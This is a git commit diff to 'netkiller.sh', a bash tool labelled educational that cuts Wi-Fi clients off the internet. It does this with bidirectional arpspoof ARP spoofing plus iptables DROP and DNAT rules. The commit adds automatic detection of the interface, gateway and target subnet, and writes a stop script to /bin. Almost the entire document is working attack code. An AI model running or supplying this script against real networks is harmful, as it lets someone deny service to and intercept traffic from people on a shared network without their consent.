a1293377fe07caf9641d6c837b1caeb23e4ea69e
rff ald <117867334+xiv3r@users.noreply.github.com>
2025-07-12 22:15:09 +0800

    Update netkiller.sh

--- netkiller.sh
+++ netkiller.sh
@@ -3,12 +3,38 @@
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
 # Requires: arpspoof, iptables, and root privileges
 
-echo "Enter Router Gateway IP:"
-read -p "> " GATEWAY
-echo "Enter Target IP (space-separated for multiple):"
-read -p "> " TARGET_IPS
-echo "Enter Interface (wlan0):"
-read -p "> " INTERFACE
+# Detect Interface
+WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
+echo "Enter Wireless Interface: Enter by default"
+read -p "> $WLAN " WLN
+INTERFACE="${WLN:-$WLAN}"
+
+# Detect Gateway IP
+GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
+echo "Enter Router Gateway IP: Enter by default"
+read -p "> $GW" INET
+GATEWAY="${INET:-$GW}"
+
+# Detect Subnet
+MASK=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
+echo "Enter multiple target: e.g 192.168.1.110 192.168.1.111"
+read -p "> " IPS
+TARGET_IPS="${IPS:-$MASK}"
+
+# Detect Device IP
+echo "Enter Device IP: Enter by default"
+IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
+read -p "> $IP" DEVIP
+MYIP="${DEVIP:-$IP}"
+
+echo ""
+# Prompt configuration
+echo "Your Arpspoof Configurations..."
+echo ""
+echo "|INTERFACE: | $INTERFACE"
+echo "|GATEWAY:   | $GATEWAY"
+echo "|MYIP:      | $MYIP"
+echo "|TARGETS:   | $TARGET_IPS"
 
 # Enable IP Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -17,6 +43,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -F
 iptables -X
 iptables -t nat -F
+iptables -F FORWARD
 
 # Remove Iptables rules
 cat > /bin/netkiller-stop << EOF
@@ -25,27 +52,24 @@ cat > /bin/netkiller-stop << EOF
 iptables -F
 iptables -X
 iptables -t nat -F
-pkill arpsoof
-echo "Wifi clients connections are restored"
+iptables -F FORWARD
+pkill arpspoof
+echo "Restoring the Connections..."
 EOF
 chmod 755 /bin/netkiller-stop
 
 for TARGET in $TARGET_IPS; do
-   
-    # Block all traffic of the target wifi clients
-    iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
-    iptables -I FORWARD -d "$GATEWAY" -s "$TARGET" -j DROP
-    iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-   
-    # Uncomment to Block all the traffic
-    # iptables -I FORWARD -i "$INTERFACE" -j DROP
-    # iptables -I FORWARD -o "$INTERFACE" -j DROP
-    
+       # Block all traffic of the target wifi clients
     (
+        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
+        iptables -I FORWARD -d "$GATEWAY" -s "$TARGET"  -j DROP
+        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+      
+      # Bidirectional Arp Spoofing
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
     ) &
 done
 
-echo "Attacks are running in the background...!!!"
-echo "Type: netkiller-stop to restore the wifi clients internet connection..."
+echo "Attacks is running in the background...!!!"
+echo "To stop, Run: netkiller-stop"
